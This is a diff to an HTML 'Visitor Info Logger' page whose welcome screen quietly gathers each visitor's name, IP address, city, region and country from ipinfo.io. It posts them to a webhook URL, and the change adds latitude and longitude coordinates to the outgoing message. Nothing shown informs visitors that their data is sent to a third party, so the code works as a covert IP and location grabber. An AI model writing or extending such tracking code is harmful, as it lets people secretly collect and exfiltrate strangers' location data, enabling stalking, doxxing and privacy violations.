@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Visitor Info Logger</title>
+  <title>Visitor Info Logger with Coordinates</title>
 </head>
 <body>
   <h2>Welcome!</h2>
@@ -26,8 +26,18 @@
       fetch("https://ipinfo.io/json")
         .then(res => res.json())
         .then(ipData => {
+          // ipData.loc is a string like "latitude,longitude"
+          const coords = ipData.loc ? ipData.loc.split(",") : ["Unknown", "Unknown"];
+          const latitude = coords[0];
+          const longitude = coords[1];
+
           const message = {
-            content: `👤 Visitor Name: **${name}**\n🌐 IP: ${ipData.ip}\n🏙️ City: ${ipData.city}\n🌍 Region: ${ipData.region}\n🇺🇸 Country: ${ipData.country}`
+            content: `👤 Visitor Name: **${name}**\n` +
+                     `🌐 IP: ${ipData.ip}\n` +
+                     `🏙️ City: ${ipData.city}\n` +
+                     `🌍 Region: ${ipData.region}\n` +
+                     `🇺🇸 Country: ${ipData.country}\n` +
+                     `📍 Coordinates: Latitude ${latitude}, Longitude ${longitude}`
           };
 
           fetch(webhookURL, {
